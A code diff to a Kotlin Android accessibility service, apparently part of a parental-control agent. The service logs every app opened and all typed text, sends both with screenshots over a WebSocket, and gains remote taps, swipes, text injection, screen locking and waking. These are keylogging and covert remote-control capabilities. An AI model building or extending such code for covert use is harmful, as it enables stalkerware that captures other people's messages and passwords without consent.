@@ -1,16 +1,23 @@
 package com.controlparental.agent.services
 
 import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.GestureDescription
 import android.annotation.SuppressLint
+import android.app.admin.DevicePolicyManager
 import android.content.Context
 import android.graphics.Bitmap
+import android.graphics.Path
+import android.media.AudioManager
 import android.os.Build
+import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
+import android.os.PowerManager
 import android.util.Base64
 import android.util.Log
 import android.view.Display
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
 import com.controlparental.agent.net.AgentWebSocketClient
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
@@ -29,7 +36,6 @@ class ParentalAccessibilityService : AccessibilityService(), AgentWebSocketClien
     private var locationTracker: LocationTracker? = null
     private var lastPackage: String? = null
     private var lastTypedText: String? = null
-    private var lastTypedTime: Long = 0
     private var isLiveActive = false
     private val mainHandler = Handler(Looper.getMainLooper())
     private val executor = Executors.newSingleThreadExecutor()
@@ -55,35 +61,38 @@ class ParentalAccessibilityService : AccessibilityService(), AgentWebSocketClien
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
         val pkg = event.packageName?.toString() ?: return
+        if (pkg.contains("com.controlparental.agent")) return
+
+        val nowIso = isoFormat.format(Date())
 
         when (event.eventType) {
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                 val className = event.className?.toString() ?: ""
-                if (pkg != lastPackage && !pkg.contains("com.controlparental.agent")) {
+                if (pkg != lastPackage) {
                     lastPackage = pkg
                     val activityJson = JSONObject().apply {
                         put("type", "activity")
                         put("app", pkg)
                         put("title", className)
                         put("detected", null)
-                        put("ts", isoFormat.format(Date()))
+                        put("ts", nowIso)
                     }
                     wsClient?.send(activityJson)
-                    Log.i("ParentalAccService", "App activa: $pkg ($className)")
+                    Log.i("ParentalAccService", "App activa detectada: $pkg")
                 }
             }
-            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                val text = event.text?.joinToString(" ")?.trim() ?: ""
-                val now = System.currentTimeMillis()
+            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
+            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
+                val textList = event.text
+                val text = if (!textList.isNullOrEmpty()) textList.joinToString(" ").trim() else ""
                 if (text.isNotEmpty() && text != lastTypedText) {
                     lastTypedText = text
-                    lastTypedTime = now
                     val typingJson = JSONObject().apply {
                         put("type", "typing")
                         put("app", pkg)
                         put("title", lastPackage ?: pkg)
                         put("text", text)
-                        put("ts", isoFormat.format(Date()))
+                        put("ts", nowIso)
                     }
                     wsClient?.send(typingJson)
                     Log.i("ParentalAccService", "Texto capturado en $pkg: $text")
@@ -135,22 +144,71 @@ class ParentalAccessibilityService : AccessibilityService(), AgentWebSocketClien
         wsClient?.send(json)
     }
 
+    // ---------- Control Remoto Tactil (Gestures) ----------
+    override fun onTap(x: Int, y: Int) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
+            val stroke = GestureDescription.StrokeDescription(path, 0, 50)
+            val gesture = GestureDescription.Builder().addStroke(stroke).build()
+            dispatchGesture(gesture, null, null)
+            Log.i("ParentalAccService", "Toque remoto ejecutado en ($x, $y)")
+        }
+    }
+
+    override fun onSwipe(x1: Int, y1: Int, x2: Int, y2: Int, duration: Int) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            val path = Path().apply {
+                moveTo(x1.toFloat(), y1.toFloat())
+                lineTo(x2.toFloat(), y2.toFloat())
+            }
+            val dur = duration.coerceIn(100, 350).toLong()
+            val stroke = GestureDescription.StrokeDescription(path, 0, dur)
+            val gesture = GestureDescription.Builder().addStroke(stroke).build()
+            dispatchGesture(gesture, null, null)
+            Log.i("ParentalAccService", "Deslizamiento remoto ejecutado: ($x1, $y1) -> ($x2, $y2) dur=${dur}ms")
+        }
+    }
+
+    override fun onText(text: String) {
+        val rootNode = rootInActiveWindow ?: return
+        val focused = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
+        if (focused != null) {
+            val args = Bundle().apply {
+                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
+            }
+            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
+            Log.i("ParentalAccService", "Texto inyectado remotamente: $text")
+        }
+    }
+
     override fun onCommand(command: String, params: JSONObject) {
         Log.i("ParentalAccService", "Comando recibido: $command")
         when (command) {
             "request_location" -> locationTracker?.queryLastKnown()
             "request_screenshot" -> captureSingleFrame()
             "lock" -> {
-                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
+                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                 try {
                     dpm?.lockNow()
-                    Log.i("ParentalAccService", "Pantalla bloqueada por comando remoto.")
                 } catch (e: Exception) {
-                    performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
+                    }
                 }
             }
             "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
             "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
+            "recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
+            "wake" -> {
+                val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
+                val wl = pm?.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP, "ParentalApp:Wake")
+                wl?.acquire(3000)
+            }
+            "volume_up", "volume_down" -> {
+                val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
+                val dir = if (command == "volume_up") AudioManager.ADJUST_RAISE else AudioManager.ADJUST_LOWER
+                am?.adjustStreamVolume(AudioManager.STREAM_MUSIC, dir, AudioManager.FLAG_SHOW_UI)
+            }
         }
     }
 
@@ -160,7 +218,7 @@ class ParentalAccessibilityService : AccessibilityService(), AgentWebSocketClien
         captureSingleFrame {
             mainHandler.postDelayed({
                 if (isLiveActive) startScreenCaptureLoop()
-            }, 1000L) // 1 FPS
+            }, 800L)
         }
     }
 
